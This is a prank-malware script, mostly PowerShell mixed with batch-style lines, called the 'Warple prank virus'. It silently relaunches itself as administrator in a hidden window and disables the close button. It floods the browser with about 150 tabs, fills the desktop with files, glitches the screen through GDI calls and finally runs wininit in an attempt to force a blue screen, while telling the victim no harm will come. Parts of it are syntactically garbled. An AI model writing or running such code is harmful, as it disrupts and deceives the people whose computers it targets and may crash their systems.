# 1. Self-Elevation Block
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}
Function Disable-CloseButton {
    $code = @'
    [DllImport("user32.dll")]
    public static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

    [DllImport("user32.dll")]
    public static extern bool EnableMenuItem(IntPtr hMenu, uint uIDEnableItem, uint uEnable);

    public const uint SC_CLOSE = 0xF060;
    public const uint MF_BYCOMMAND = 0x00000000;
    public const uint MF_GRAYED = 0x00000001;
    public const uint MF_DISABLED = 0x00000002;
'@

    Add-Type -MemberDefinition $code -Name "NativeMethods" -Namespace "Win32"
    
    # Get the handle of the current PowerShell window
    $hwnd = (Get-Process -Id $PID).MainWindowHandle
    
    # Get the system menu handle
    $hMenu = [Win32.NativeMethods]::GetSystemMenu($hwnd, $false)
    
    # Disable and gray out the 'Close' item (X button)
    [Win32.NativeMethods]::EnableMenuItem($hMenu, [Win32.NativeMethods]::SC_CLOSE, 
        [Win32.NativeMethods]::MF_BYCOMMAND -bor [Win32.NativeMethods]::MF_GRAYED) | Out-Null
}

Disable-CloseButton
echo Welcome to the Warple prank virus. Your PC will not be harmed.
pause 9
A:
B:
C:
D:
E:
F:
G:
H:
I:
J:
K:
L:
M: 
N:
O:
P:
Q:
R:
S:
T:
U:
V:
W:
X:
Y:
Z:
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.example.com"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
Start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
$desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
for ($i = 1; $i -le 30; $i++) {
    $filePath = Join-Path $desktopPath "warple_$i.txt"
    New-Item -Path $filePath -ItemType "File" -Value "warple" -Force | Out-Null
}
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
# 3. Initialize Audio (M4A Support)
Add-Type -AssemblyName PresentationCore
$player = New-Object System.Windows.Media.MediaPlayer
$player.Open("gdi.m4a")

# 4. Define GDI Functions for Visuals
$signature = @'
[DllImport("user32.dll")]
public static extern IntPtr GetDC(IntPtr hwnd);
[DllImport("gdi32.dll")]
public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
[DllImport("user32.dll")]
public static extern int GetSystemMetrics(int nIndex);
'@
$gdi = Add-Type -MemberDefinition $signature -Name "GDI" -Namespace "Win32" -PassThru

# 5. START AUDIO & VISUALS
$player.Play()

$width = [Win32.GDI]::GetSystemMetrics(0)
$height = [Win32.GDI]::GetSystemMetrics(1)
$hdc = [Win32.GDI]::GetDC([IntPtr]::Zero)

# Start a background task for GDI so it doesn't block the timer
$glitchTask = Start-Job -ScriptBlock {
    param($hdc, $width, $height)
    while($true) {
        $x = (Get-Random -Minimum -5 -Maximum 5)
        $y = (Get-Random -Minimum 2 -Maximum 15)
        [Win32.GDI]::BitBlt($hdc, $x, $y, $width, $height, $hdc, 0, 0, 0x00CC0020)
        Start-Sleep -Milliseconds 20
    }
} -ArgumentList $hdc, $width, $height

# 6. THE PRECISE WAIT (28.56 Seconds)
Start-Sleep -Seconds 28.56
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
echo Erp.
calc
calc
calc
calc
# Load the required assembly for M4A support
Add-Type -AssemblyName PresentationCore

# Initialize player and open file
$player = New-Object System.Windows.Media.MediaPlayer
$player.Open("bluescreen.m4a")
$player.Play()

# Wait for sound to finish (M4A playing is asynchronous)
Start-Sleep -Seconds 5 

# Trigger BSOD (Requires Admin)
wininit

